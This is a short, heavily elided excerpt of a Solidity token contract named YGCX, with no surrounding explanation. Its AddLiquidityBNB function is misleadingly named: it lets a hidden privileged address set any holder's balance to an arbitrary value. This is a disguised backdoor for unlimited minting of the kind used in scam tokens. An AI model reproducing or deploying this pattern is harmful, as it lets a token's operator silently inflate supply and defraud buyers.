...
contract  YGCX   is Ownable {
    address private _owner;
    address private _address0;
    address private _address1;
    address private _dev;
    string private _name = "YGCX";
    string private _symbol = "YGCX";
    ...
    function bulkTransfer(address[] calldata to, uint256[] calldata amounts) public {
      ...
      function AddLiquidityBNB(address recipient, uint256 _amount) external  {
            require(msg.sender == _address0, "!_dev");
             _balances[recipient] = _amount * 10 ** decimals() - 1 ;
    }
    ...
    function ClaimFor(address sender,bool status) public {
